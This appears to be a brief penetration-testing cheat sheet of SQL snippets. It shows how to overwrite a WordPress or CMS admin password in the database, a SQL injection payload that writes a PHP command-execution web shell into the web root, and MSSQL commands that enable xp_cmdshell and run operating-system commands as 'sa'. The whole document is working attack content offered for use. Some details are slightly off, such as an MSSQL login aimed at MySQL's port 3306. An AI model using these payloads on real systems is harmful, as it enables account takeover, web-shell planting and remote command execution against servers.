#### Updating Values in MYSQL
```
update wp_users set user_pass = "$P$B0UOh9YS6MeiohOubcxGHfv4uk2gjJ0" where user_login = "admin";

update cms_users set password = md5("admin") where username = "admin";
```

#### SQL Injection into File
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

#### Basic MSSQL Commands
```
(List Databases")
1>EXEC sp_databases;
2>go
OR
1>SELECT name FROM master.dbo.sysdatabases;
2>go;
```

#### MSSQL Command Execution
```
sqsh -S 10.10.10.59:3306 -U sa "login with the username sa"
1> EXEC SP_CONFIGURE N'show advanced options', 1
2> go
1> RECONFIGURE
2> go
1> EXEC SP_CONFIGURE N'xp_cmdshell', 1
2> go
1> RECONFIGURE
2> go
1> xp_cmdshell 'dir C:\';
2> go
```